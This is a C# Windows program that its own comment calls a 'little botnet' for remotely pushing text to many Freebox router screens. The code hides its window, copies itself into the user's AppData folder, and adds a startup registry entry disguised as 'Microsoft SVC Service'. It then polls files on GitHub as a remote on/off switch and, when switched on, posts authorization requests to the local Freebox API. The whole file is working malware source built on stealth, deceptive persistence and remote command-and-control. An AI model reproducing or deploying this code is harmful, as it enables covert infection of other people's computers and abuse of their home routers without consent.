using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using RestSharp;
using Microsoft.Win32;
using System.IO;
using System.Net.Http;
using Newtonsoft.Json;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Tab;
using System.Web.Script.Serialization;
using System.Net.Http.Headers;
using static System.Net.WebRequestMethods;
using System.Security.Cryptography;
using System.Diagnostics;

namespace Request
{
    public partial class MainForm : Form
    {
        //Little botnet to remotly send text to a lot of Freebox screens.
        public string apiURL = "http://mafreebox.freebox.fr/api/v8/login/authorize/";
        public string stateURL = "https://raw.githubusercontent.com/Zpk2/FreeBoxBotNet/main/active.txt";
        public string appID = "https://raw.githubusercontent.com/Zpk2/FreeBoxBotNet/main/app_id.txt";
        public string appName = "https://raw.githubusercontent.com/Zpk2/FreeBoxBotNet/main/app_name.txt";
        public string appVersion = "https://raw.githubusercontent.com/Zpk2/FreeBoxBotNet/main/app_version.txt";
        public string deviceName = "https://raw.githubusercontent.com/Zpk2/FreeBoxBotNet/main/device_name.txt";

        public MainForm()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.ShowInTaskbar = false;
            this.ShowIcon = false;
            this.Size = new Size(0, 0);
            this.Opacity = 0.0;
            this.Left = 0;
            this.Top = 0;
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            timerRefresh.Enabled = false;
            setupAPP();
        }

        private void setupAPP()
        {
            string currentPath = System.Reflection.Assembly.GetEntryAssembly().Location;
            string newPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FreeBoxBotNet.exe";

            if (currentPath == newPath)
            {
                timerRefresh.Enabled = true;
                //All ok
            }
            else
            {
                try
                {
                    System.IO.File.Copy(currentPath, newPath);
                }
                catch (Exception)
                {
                    //Can't copy file to new destination
                }

                try
                {
                    using (RegistryKey objRegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                    {
                        objRegistryKey.SetValue("Microsoft SVC Service", "\"" + newPath + "\"");
                    }
                }
                catch (Exception)
                {
                    //Can't create startup reg key
                }

                try
                {
                    Process.Start(newPath);
                }
                catch (Exception)
                {
                    //Can't start new path
                }

                Environment.Exit(0);
            } 
        }

        private void timerRefresh_Tick(object sender, EventArgs e)
        {
            if (FetchState() == "true")
            {
                try
                {
                    SendRequest();
                }
                catch (Exception)
                {
                    //Do nothing
                }
            }
            else if (FetchState() == "false")
            {
                //Do nothing
            }
        }

        private string FetchState()
        {
            WebClient webClientState = new WebClient();
            try
            {
                string state = webClientState.DownloadString(stateURL);
                return state;
            }
            catch (Exception)
            {
                return "false";
            }
            
        }

        private string FetchAppID()
        {
            WebClient webClientAppID = new WebClient();
            try
            {
                string app_id = webClientAppID.DownloadString(appID);
                return app_id;
            }
            catch (Exception)
            {
                return null;
            }
        }

        private string FetchAppName()
        {
            WebClient webClientAppName = new WebClient();
            try
            {
                string app_name = webClientAppName.DownloadString(appName);
                return app_name;
            }
            catch (Exception)
            {
                return null;
            }
        }

        private string FetchAppVersion()
        {
            WebClient webClientVersion = new WebClient();
            try
            {
                string app_version = webClientVersion.DownloadString(appVersion);
                return app_version;
            }
            catch (Exception)
            {
                return null;
            }
        }

        private string FetchDeviceName()
        {
            WebClient webClientDeviceName = new WebClient();
            try
            {
                string device_name = webClientDeviceName.DownloadString(deviceName);
                return device_name;
            }
            catch (Exception)
            {
                return null;
            }
        }

        private void SendRequest()
        {
            var httpWebRequest = (HttpWebRequest)WebRequest.Create(apiURL);
            httpWebRequest.ContentType = "application/json";
            httpWebRequest.Method = "POST";

            using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
            {
                string json = new JavaScriptSerializer().Serialize(new
                {
                    app_id = FetchAppID(),
                    app_name = FetchAppName(),
                    app_version = FetchAppVersion(),
                    device_name = FetchDeviceName()
                });

                streamWriter.Write(json);
            }

            var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
            {
                var result = streamReader.ReadToEnd();
            }
        }
    }
}
